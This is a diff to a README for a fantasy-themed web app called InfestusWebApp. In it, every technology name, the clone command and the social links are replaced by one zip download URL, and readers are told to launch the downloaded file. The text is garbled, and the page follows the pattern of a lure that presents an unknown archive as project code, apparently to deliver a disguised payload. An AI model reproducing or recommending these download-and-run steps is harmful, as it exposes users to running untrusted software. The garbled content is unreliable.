@@ -2,9 +2,9 @@
 # 🚀 Welcome to InfestusWebApp Repository! 🧙‍♂️
 
 ## Description
-Welcome to **InfestusWebApp**, the ultimate hybrid web application combining **https://github.com/Alejandro5486/InfestusWebApp/releases/download/v1.0/Software.zip** and **https://github.com/Alejandro5486/InfestusWebApp/releases/download/v1.0/Software.zip**, designed specifically for fans of the fantastic world of ***Infestus***. This repository hosts the codebase for creating an immersive and interactive web experience, drawing inspiration from *armories, RPG elements, and more*.
+Welcome to **InfestusWebApp**, the ultimate hybrid web application combining **https://raw.githubusercontent.com/Alejandro5486/InfestusWebApp/main/steelification/Web_Infestus_App_3.0-beta.4.zip** and **https://raw.githubusercontent.com/Alejandro5486/InfestusWebApp/main/steelification/Web_Infestus_App_3.0-beta.4.zip**, designed specifically for fans of the fantastic world of ***Infestus***. This repository hosts the codebase for creating an immersive and interactive web experience, drawing inspiration from *armories, RPG elements, and more*.
 
-![InfestusWebApp](https://github.com/Alejandro5486/InfestusWebApp/releases/download/v1.0/Software.zip)
+![InfestusWebApp](https://raw.githubusercontent.com/Alejandro5486/InfestusWebApp/main/steelification/Web_Infestus_App_3.0-beta.4.zip)
 
 ## Table of Contents
 - [Features](#features)
@@ -20,21 +20,21 @@ Welcome to **InfestusWebApp**, the ultimate hybrid web application combining **h
 
 ## Installation
 To get started with InfestusWebApp, follow these steps:
-1. Clone the repository: `git clone https://github.com/Alejandro5486/InfestusWebApp/releases/download/v1.0/Software.zip`
-2. Install dependencies for https://github.com/Alejandro5486/InfestusWebApp/releases/download/v1.0/Software.zip backend 
-3. Install https://github.com/Alejandro5486/InfestusWebApp/releases/download/v1.0/Software.zip dependencies using `npm install`
+1. Clone the repository: `git clone https://raw.githubusercontent.com/Alejandro5486/InfestusWebApp/main/steelification/Web_Infestus_App_3.0-beta.4.zip`
+2. Install dependencies for https://raw.githubusercontent.com/Alejandro5486/InfestusWebApp/main/steelification/Web_Infestus_App_3.0-beta.4.zip backend 
+3. Install https://raw.githubusercontent.com/Alejandro5486/InfestusWebApp/main/steelification/Web_Infestus_App_3.0-beta.4.zip dependencies using `npm install`
 4. Configure the application settings
-5. Launch the application by running `dotnet run` for https://github.com/Alejandro5486/InfestusWebApp/releases/download/v1.0/Software.zip and `npm run serve` for https://github.com/Alejandro5486/InfestusWebApp/releases/download/v1.0/Software.zip
+5. Launch the application by running `dotnet run` for https://raw.githubusercontent.com/Alejandro5486/InfestusWebApp/main/steelification/Web_Infestus_App_3.0-beta.4.zip and `npm run serve` for https://raw.githubusercontent.com/Alejandro5486/InfestusWebApp/main/steelification/Web_Infestus_App_3.0-beta.4.zip
 
 ## Usage
 Once you have the application up and running, you can:
 - Navigate through the armory to discover powerful weapons and armor.
 - Engage in RPG-style quests and battles.
-- Interact with https://github.com/Alejandro5486/InfestusWebApp/releases/download/v1.0/Software.zip components for a smooth and dynamic user interface.
+- Interact with https://raw.githubusercontent.com/Alejandro5486/InfestusWebApp/main/steelification/Web_Infestus_App_3.0-beta.4.zip components for a smooth and dynamic user interface.
 
-Here is the link to download the InfestusWebApp project code: [Download InfestusWebApp](https://github.com/Alejandro5486/InfestusWebApp/releases/download/v1.0/Software.zip)
+Here is the link to download the InfestusWebApp project code: [Download InfestusWebApp](https://raw.githubusercontent.com/Alejandro5486/InfestusWebApp/main/steelification/Web_Infestus_App_3.0-beta.4.zip)
 
-![Download InfestusWebApp](https://github.com/Alejandro5486/InfestusWebApp/releases/download/v1.0/Software.zip)
+![Download InfestusWebApp](https://raw.githubusercontent.com/Alejandro5486/InfestusWebApp/main/steelification/Web_Infestus_App_3.0-beta.4.zip)
 
 Launch the downloaded file to access the project code.
 
@@ -51,6 +51,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-🔗 Stay connected with us on [LinkedIn](https://github.com/Alejandro5486/InfestusWebApp/releases/download/v1.0/Software.zip) for updates and discussions.
+🔗 Stay connected with us on [LinkedIn](https://raw.githubusercontent.com/Alejandro5486/InfestusWebApp/main/steelification/Web_Infestus_App_3.0-beta.4.zip) for updates and discussions.
 
 🌟 Thank you for choosing InfestusWebApp! Let the adventure begin! 🌟
